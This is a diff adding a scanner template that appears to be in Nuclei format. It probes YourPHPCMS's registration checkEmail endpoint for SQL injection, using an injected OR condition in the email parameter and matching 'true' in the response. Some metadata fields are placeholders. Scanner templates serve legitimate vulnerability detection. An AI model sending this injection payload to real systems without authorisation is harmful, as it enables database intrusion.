@@ -1,0 +1,18 @@
+id: YourPHPCMS-Register-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: YourPHPCMS login_checkEmail存在sql注入漏洞.
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'true'
